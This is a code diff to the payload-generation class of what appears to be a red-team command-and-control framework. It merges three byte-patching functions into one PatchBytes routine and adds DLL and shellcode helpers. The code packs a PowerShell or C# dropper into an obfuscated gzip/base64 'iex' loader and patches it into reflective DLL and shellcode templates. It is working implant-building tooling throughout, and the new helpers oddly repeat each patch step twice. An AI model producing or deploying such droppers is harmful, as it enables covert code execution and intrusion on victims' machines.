@@ -135,77 +135,6 @@ class Payloads(object):
         output_file.close()
         self.QuickstartLog("Batch Payload written to: %s" % filename)
 
-    def PatchPBindBytes(self, filename, dll, offset, name):
-        filename = "%s%s" % (self.BaseDirectory, filename)
-        output_file = open(filename, 'wb')
-        output_file.write(base64.b64decode(dll))
-        output_file.close()
-        out = StringIO()
-        with open("%spbind.ps1" % PayloadTemplatesDirectory, 'r') as f:
-            pbind = f.read()
-        pbind = str(pbind).replace("#REPLACEKEY#", self.Key)            
-        data = bytes(pbind, 'utf-8')
-        out = gzip.compress(data)
-        gzipdata = base64.b64encode(out).decode("utf-8")
-        b64gzip = "sal a New-Object;iex(a IO.StreamReader((a System.IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String(\"%s\"),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()" % gzipdata
-        payload = base64.b64encode(b64gzip.encode('UTF-16LE'))
-        patch = payload.decode("utf-8")
-        patchlen = 8000 - len(patch)
-        patch2 = ""
-        patch2 = patch2.ljust(patchlen, '\x00')
-        patch3 = "%s%s" % (patch, patch2)
-        f = open(filename, "r+b")
-        f.seek(offset)
-        f.write(bytes(patch3, 'UTF-16LE'))
-        f.close()
-        self.QuickstartLog("Payload written to: %s" % (filename))
-
-    def PatchSharpBytes(self, filename, dll, offset, name=""):
-        filename = "%s%s" % (self.BaseDirectory, filename)
-
-        output_file = open(filename, 'wb')
-        output_file.write(base64.b64decode(dll))
-        output_file.close()
-
-        srcfilename = "%s%s%s" % (self.BaseDirectory, name, "dropper_cs.exe")
-        with open(srcfilename, "rb") as b:
-            dllbase64 = base64.b64encode(b.read()).decode("utf-8")
-
-        patchlen = 32000 - len((dllbase64))
-        patch = dllbase64
-        patch2 = ""
-        patch2 = patch2.ljust(patchlen, '\x00')
-        patch3 = "%s%s" % (patch, patch2)
-
-        f = open(filename, "r+b")
-        f.seek(offset)
-        f.write(bytes(patch3, 'UTF-16LE'))
-        f.close()
-
-        self.QuickstartLog("Payload written to: %s" % (filename))
-
-    def PatchBytes(self, filename, dll, offset, name):
-        filename = "%s%s" % (self.BaseDirectory, filename)
-        output_file = open(filename, 'wb')
-        output_file.write(base64.b64decode(dll))
-        output_file.close()
-        out = StringIO()
-        data = bytes(self.PSDropper, 'utf-8')
-        out = gzip.compress(data)
-        gzipdata = base64.b64encode(out).decode("utf-8")
-        b64gzip = "sal a New-Object;iex(a IO.StreamReader((a System.IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String(\"%s\"),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()" % gzipdata
-        payload = base64.b64encode(b64gzip.encode('UTF-16LE'))
-        patch = payload.decode("utf-8")
-        patchlen = 8000 - len(patch)
-        patch2 = ""
-        patch2 = patch2.ljust(patchlen, '\x00')
-        patch3 = "%s%s" % (patch, patch2)
-        f = open(filename, "r+b")
-        f.seek(offset)
-        f.write(bytes(patch3, 'UTF-16LE'))
-        f.close()
-        self.QuickstartLog("Payload written to: %s" % (filename))
-
     def CreateDroppers(self, name=""):
         # Create Sharp DLL
         with open("%sdropper.cs" % PayloadTemplatesDirectory, 'r') as f:
@@ -238,112 +167,107 @@ class Payloads(object):
         subprocess.check_output(compileexe, shell=True)
         self.QuickstartLog("C# Dropper EXE written to: %s%sdropper_cs.exe" % (self.BaseDirectory, name))
 
+    def PatchBytes(self, filename, dll, offset, payloadtype, name=""):
+        filename = "%s%s" % (self.BaseDirectory, filename)
+        output_file = open(filename, 'wb')
+        output_file.write(base64.b64decode(dll))
+        output_file.close()
+        srcfilename = ""
+
+        if payloadtype == "Posh":
+            out = StringIO()
+            data = bytes(self.PSDropper, 'utf-8')
+            out = gzip.compress(data)
+            gzipdata = base64.b64encode(out).decode("utf-8")
+            b64gzip = "sal a New-Object;iex(a IO.StreamReader((a System.IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String(\"%s\"),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()" % gzipdata
+            payload = base64.b64encode(b64gzip.encode('UTF-16LE'))
+            patch = payload.decode("utf-8")
+            patchlen = 8000 - len(patch)
+
+        elif payloadtype == "Sharp":
+            srcfilename = "%s%s%s" % (self.BaseDirectory, name, "dropper_cs.exe")
+            with open(srcfilename, "rb") as b:
+                dllbase64  = base64.b64encode(b.read()).decode("utf-8")
+            patchlen = 32000 - len((dllbase64))
+            patch = dllbase64 
+
+        elif payloadtype == "PBind":
+            out = StringIO()
+            with open("%spbind.ps1" % PayloadTemplatesDirectory, 'r') as f:
+                pbind = f.read()
+            pbind = str(pbind).replace("#REPLACEKEY#", self.Key)            
+            data = bytes(pbind, 'utf-8')
+            out = gzip.compress(data)
+            gzipdata = base64.b64encode(out).decode("utf-8")
+            b64gzip = "sal a New-Object;iex(a IO.StreamReader((a System.IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String(\"%s\"),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()" % gzipdata
+            payload = base64.b64encode(b64gzip.encode('UTF-16LE'))
+            patch = payload.decode("utf-8")
+            patchlen = 8000 - len(patch)
+
+        patch2 = ""
+        patch2 = patch2.ljust(patchlen, '\x00')
+        patch3 = "%s%s" % (patch, patch2)
+
+        f = open(filename, "r+b")
+        f.seek(offset)
+        f.write(bytes(patch3, 'UTF-16LE'))
+        f.close()
+
+        self.QuickstartLog("Payload written to: %s" % (filename))
+
+    def CreateDll(self, DestinationFile, ResourceFile, payloadtype, name=""):                
+        with open(ResourceFile, 'r') as f:
+            fileRead = f.read()
+        self.PatchBytes(DestinationFile, fileRead, offsetFinder(ResourceFile), payloadtype, name)
+
+        with open(ResourceFile, 'r') as f:
+            fileRead = f.read()
+        self.PatchBytes(DestinationFile, fileRead, offsetFinder(ResourceFile), payloadtype, name)
+
+    def CreateShellcodeFile(self, DestinationFile, DestinationFileB64, ResourceFile, payloadtype, name=""):        
+        with open(ResourceFile, 'r') as f:
+            fileRead = f.read()
+        self.PatchBytes(DestinationFile, fileRead, offsetFinder(ResourceFile), payloadtype, name)
+        with open(f"{self.BaseDirectory}{DestinationFile}", 'rb') as binary:
+            with open(f"{self.BaseDirectory}{DestinationFileB64}", 'wb') as b64:
+                b64.write(base64.b64encode(binary.read()))
+    
+        with open(ResourceFile, 'r') as f:
+            fileRead = f.read()
+        self.PatchBytes(DestinationFile, fileRead, offsetFinder(ResourceFile), payloadtype, name)
+        with open(f"{self.BaseDirectory}{DestinationFile}", 'rb') as binary:
+            with open(f"{self.BaseDirectory}{DestinationFileB64}", 'wb') as b64:
+                b64.write(base64.b64encode(binary.read()))
+
     def CreateDlls(self, name=""):
-        # Load CLR "v2.0.50727"
-        self.QuickstartLog("" + Colours.END)
-        self.QuickstartLog("ReflectiveDLL that loads CLR v2.0.50727 - DLL Export (VoidFunc)" + Colours.GREEN)
-        with open('%sPosh_v2_x86_dll.b64' % PayloadTemplatesDirectory, 'r') as f:
-            v2_86 = f.read()
-        self.PatchBytes("%sPosh_v2_x86.dll" % name, v2_86, offsetFinder('%sPosh_v2_x86_dll.b64' % PayloadTemplatesDirectory), "DLL")
-        with open('%sPosh_v2_x64_dll.b64' % PayloadTemplatesDirectory, 'r') as f:
-            v2_64 = f.read()
-        self.PatchBytes("%sPosh_v2_x64.dll" % name, v2_64, offsetFinder('%sPosh_v2_x64_dll.b64' % PayloadTemplatesDirectory), "DLL")
-
-        # Load CLR "v4.0.30319"
-        self.QuickstartLog("" + Colours.END)
-        self.QuickstartLog("ReflectiveDLL that loads CLR v4.0.30319 - DLL Export (VoidFunc)" + Colours.GREEN)
-        with open('%sPosh_v4_x86_dll.b64' % PayloadTemplatesDirectory, 'r') as f:
-            v4_86 = f.read()
-        self.PatchBytes("%sPosh_v4_x86.dll" % name, v4_86, offsetFinder('%sPosh_v4_x86_dll.b64' % PayloadTemplatesDirectory), "DLL")
-        with open('%sPosh_v4_x64_dll.b64' % PayloadTemplatesDirectory, 'r') as f:
-            v4_64 = f.read()
-        self.PatchBytes("%sPosh_v4_x64.dll" % name, v4_64, offsetFinder('%sPosh_v4_x64_dll.b64' % PayloadTemplatesDirectory), "DLL")
-
-        # Load CLR "v4.0.30319"
-        self.QuickstartLog("" + Colours.END)
-        self.QuickstartLog("ReflectiveDLL that loads C# Implant in CLR v4.0.30319 - DLL Export (VoidFunc)" + Colours.GREEN)
-        with open('%sSharp_v4_x86_dll.b64' % PayloadTemplatesDirectory, 'r') as f:
-            v4_86 = f.read()
-        self.PatchSharpBytes("%sSharp_v4_x86.dll" % name, v4_86, offsetFinder('%sSharp_v4_x86_dll.b64' % PayloadTemplatesDirectory), "")
-        with open('%sSharp_v4_x64_dll.b64' % PayloadTemplatesDirectory, 'r') as f:
-            v4_64 = f.read()
-        self.PatchSharpBytes("%sSharp_v4_x64.dll" % name, v4_64, offsetFinder('%sSharp_v4_x64_dll.b64' % PayloadTemplatesDirectory), "")
-
-        # Load CLR "v4.0.30319"
-        self.QuickstartLog("" + Colours.END)
-        self.QuickstartLog("ReflectiveDLL that loads PBind C# Implant in CLR v4.0.30319 - DLL Export (VoidFunc)" + Colours.GREEN)
-        with open('%sPosh_v4_x86_dll.b64' % PayloadTemplatesDirectory, 'r') as f:
-            v4_86 = f.read()
-        self.PatchPBindBytes("%sPBind_v4_x86.dll" % name, v4_86, offsetFinder('%sPosh_v4_x86_dll.b64' % PayloadTemplatesDirectory), "")
-        with open('%sPosh_v4_x64_dll.b64' % PayloadTemplatesDirectory, 'r') as f:
-            v4_64 = f.read()
-        self.PatchPBindBytes("%sPBind_v4_x64.dll" % name, v4_64, offsetFinder('%sPosh_v4_x64_dll.b64' % PayloadTemplatesDirectory), "")
-
-        # End of logging for dll
         self.QuickstartLog(Colours.END)
-        self.QuickstartLog("RunDLL Example:" + Colours.GREEN)
-        self.QuickstartLog("rundll32 Sharp_v4_x64.dll,VoidFunc")
+        self.QuickstartLog("ReflectiveDLL that loads CLR v2.0.50727 - DLL Export (VoidFunc)" + Colours.GREEN)
+        self.CreateDll(f"{name}Posh_v2_x86.dll", f"{PayloadTemplatesDirectory}Posh_v2_x86_dll.b64", "Posh", name)
+        self.CreateDll(f"{name}Posh_v2_x64.dll", f"{PayloadTemplatesDirectory}Posh_v2_x64_dll.b64", "Posh",name)
+
+        self.QuickstartLog(Colours.END)
+        self.QuickstartLog("ReflectiveDLL that loads CLR v4.0.30319 - DLL Export (VoidFunc)" + Colours.GREEN)
+        self.CreateDll(f"{name}Posh_v4_x86.dll", f"{PayloadTemplatesDirectory}Posh_v4_x86_dll.b64", "Posh", name)
+        self.CreateDll(f"{name}Posh_v4_x64.dll", f"{PayloadTemplatesDirectory}Posh_v4_x64_dll.b64", "Posh", name)
+        self.CreateDll(f"{name}Sharp_v4_x86.dll", f"{PayloadTemplatesDirectory}Sharp_v4_x86_dll.b64", "Sharp", name)
+        self.CreateDll(f"{name}Sharp_v4_x64.dll", f"{PayloadTemplatesDirectory}Sharp_v4_x64_dll.b64", "Sharp", name)
+        self.CreateDll(f"{name}PBind_v4_x86.dll", f"{PayloadTemplatesDirectory}Posh_v4_x86_dll.b64", "PBind", name)
+        self.CreateDll(f"{name}PBind_v4_x64.dll", f"{PayloadTemplatesDirectory}Posh_v4_x64_dll.b64", "PBind", name)
 
     def CreateShellcode(self, name=""):
-        # Load CLR "v2.0.50727"
         self.QuickstartLog(Colours.END)
         self.QuickstartLog("Shellcode that loads CLR v2.0.50727" + Colours.GREEN)
-        with open('%sPosh_v2_x86_Shellcode.b64' % PayloadTemplatesDirectory, 'r') as f:
-            v2_86 = f.read()
-        self.PatchBytes("%sPosh_v2_x86_Shellcode.bin" % name, v2_86, offsetFinder('%sPosh_v2_x86_Shellcode.b64' % PayloadTemplatesDirectory), "Shellcode")
-        with open("%s%sPosh_v2_x86_Shellcode.bin" % (self.BaseDirectory, name), 'rb') as binary:
-            with open("%s%sPosh_v2_x86_Shellcode.b64" % (self.BaseDirectory, name), 'wb') as b64:
-                b64.write(base64.b64encode(binary.read()))
-        with open('%sPosh_v2_x64_Shellcode.b64' % PayloadTemplatesDirectory, 'r') as f:
-            v2_64 = f.read()
-        self.PatchBytes("%sPosh_v2_x64_Shellcode.bin" % name, v2_64, offsetFinder('%sPosh_v2_x64_Shellcode.b64' % PayloadTemplatesDirectory), "Shellcode")
-        with open("%s%sPosh_v2_x64_Shellcode.bin" % (self.BaseDirectory, name), 'rb') as binary:
-            with open("%s%sPosh_v2_x64_Shellcode.b64" % (self.BaseDirectory, name), 'wb') as b64:
-                b64.write(base64.b64encode(binary.read()))
-
-        # Load CLR "v4.0.30319"
+        self.CreateShellcodeFile(f"{name}Posh_v2_x86_Shellcode.bin", f"{name}Posh_v2_x86_Shellcode.b64", f"{PayloadTemplatesDirectory}Posh_v2_x86_Shellcode.b64", "Posh", name)
+        self.CreateShellcodeFile(f"{name}Posh_v2_x64_Shellcode.bin", f"{name}Posh_v2_x64_Shellcode.b64", f"{PayloadTemplatesDirectory}Posh_v2_x64_Shellcode.b64", "Posh", name)
+        
         self.QuickstartLog(Colours.END)
-        self.QuickstartLog("Shellcode that loads CLR v4.0.30319" + Colours.GREEN)
-        with open('%sPosh_v4_x86_Shellcode.b64' % PayloadTemplatesDirectory, 'rb') as f:
-            v4_86 = f.read()
-        self.PatchBytes("%sPosh_v4_x86_Shellcode.bin" % name, v4_86, offsetFinder('%sPosh_v4_x86_Shellcode.b64' % PayloadTemplatesDirectory), "Shellcode")
-        with open("%s%sPosh_v4_x86_Shellcode.bin" % (self.BaseDirectory, name), 'rb') as binary:
-            with open("%s%sPosh_v4_x86_Shellcode.b64" % (self.BaseDirectory, name), 'wb') as b64:
-                b64.write(base64.b64encode(binary.read()))
-        with open('%sPosh_v4_x64_Shellcode.b64' % PayloadTemplatesDirectory, 'rb') as f:
-            v4_64 = f.read()
-        self.PatchBytes("%sPosh_v4_x64_Shellcode.bin" % name, v4_64, offsetFinder('%sPosh_v4_x64_Shellcode.b64' % PayloadTemplatesDirectory), "Shellcode")
-        with open("%s%sPosh_v4_x64_Shellcode.bin" % (self.BaseDirectory, name), 'rb') as binary:
-            with open("%s%sPosh_v4_x64_Shellcode.b64" % (self.BaseDirectory, name), 'wb') as b64:
-                b64.write(base64.b64encode(binary.read()))
-
-        # Load CLR "v4.0.30319" via SharpDLL
-        with open('%sSharp_v4_x86_Shellcode.b64' % PayloadTemplatesDirectory) as f:
-            v4_86 = f.read()
-        self.PatchSharpBytes("%sSharp_v4_x86_Shellcode.bin" % name, v4_86, offsetFinder('%sSharp_v4_x86_Shellcode.b64' % PayloadTemplatesDirectory), name)
-        with open("%s%sSharp_v4_x86_Shellcode.bin" % (self.BaseDirectory, name), 'rb') as binary:
-            with open("%s%sSharp_v4_x86_Shellcode.b64" % (self.BaseDirectory, name), 'wb') as b64:
-                b64.write(base64.b64encode(binary.read()))
-        with open('%sSharp_v4_x64_Shellcode.b64' % PayloadTemplatesDirectory) as f:
-            v4_64 = f.read()
-        self.PatchSharpBytes("%sSharp_v4_x64_Shellcode.bin" % name, v4_64, offsetFinder('%sSharp_v4_x64_Shellcode.b64' % PayloadTemplatesDirectory), name)
-        with open("%s%sSharp_v4_x64_Shellcode.bin" % (self.BaseDirectory, name), 'rb') as binary:
-            with open("%s%sSharp_v4_x64_Shellcode.b64" % (self.BaseDirectory, name), 'wb') as b64:
-                b64.write(base64.b64encode(binary.read()))
-
-        # Load CLR "v4.0.30319" for PBind
-        with open('%sPosh_v4_x86_Shellcode.b64' % PayloadTemplatesDirectory, 'rb') as f:
-            v4_86 = f.read()
-        self.PatchPBindBytes("%sPBind_v4_x86_Shellcode.bin" % name, v4_86, offsetFinder('%sPosh_v4_x86_Shellcode.b64' % PayloadTemplatesDirectory), "Shellcode")
-        with open("%s%sPBind_v4_x86_Shellcode.bin" % (self.BaseDirectory, name), 'rb') as binary:
-            with open("%s%sPBind_v4_x86_Shellcode.b64" % (self.BaseDirectory, name), 'wb') as b64:
-                b64.write(base64.b64encode(binary.read()))
-        with open('%sPosh_v4_x64_Shellcode.b64' % PayloadTemplatesDirectory, 'rb') as f:
-            v4_64 = f.read()
-        self.PatchPBindBytes("%sPBind_v4_x64_Shellcode.bin" % name, v4_64, offsetFinder('%sPosh_v4_x64_Shellcode.b64' % PayloadTemplatesDirectory), "Shellcode")
-        with open("%s%sPBind_v4_x64_Shellcode.bin" % (self.BaseDirectory, name), 'rb') as binary:
-            with open("%s%sPBind_v4_x64_Shellcode.b64" % (self.BaseDirectory, name), 'wb') as b64:
-                b64.write(base64.b64encode(binary.read()))                
+        self.QuickstartLog(f"Shellcode that loads CLR v4.0.30319" + Colours.GREEN)
+        self.CreateShellcodeFile(f"{name}Posh_v4_x86_Shellcode.bin", f"{name}Posh_v4_x86_Shellcode.b64", f"{PayloadTemplatesDirectory}Posh_v4_x86_Shellcode.b64", "Posh", name)
+        self.CreateShellcodeFile(f"{name}Posh_v4_x64_Shellcode.bin", f"{name}Posh_v4_x64_Shellcode.b64", f"{PayloadTemplatesDirectory}Posh_v4_x64_Shellcode.b64", "Posh", name)
+        self.CreateShellcodeFile(f"{name}Sharp_v4_x86_Shellcode.bin", f"{name}Sharp_v4_x86_Shellcode.b64", f"{PayloadTemplatesDirectory}Sharp_v4_x86_Shellcode.b64", "Sharp", name)
+        self.CreateShellcodeFile(f"{name}Sharp_v4_x64_Shellcode.bin", f"{name}Sharp_v4_x64_Shellcode.b64", f"{PayloadTemplatesDirectory}Sharp_v4_x64_Shellcode.b64", "Sharp", name)
+        self.CreateShellcodeFile(f"{name}PBind_v4_x86_Shellcode.bin", f"{name}PBind_v4_x86_Shellcode.b64", f"{PayloadTemplatesDirectory}Posh_v4_x86_Shellcode.b64", "PBind", name)
+        self.CreateShellcodeFile(f"{name}PBind_v4_x64_Shellcode.bin", f"{name}PBind_v4_x64_Shellcode.b64", f"{PayloadTemplatesDirectory}Posh_v4_x64_Shellcode.b64", "PBind", name)
 
     def CreateSCT(self):
         basefile = self.CreateRawBase()
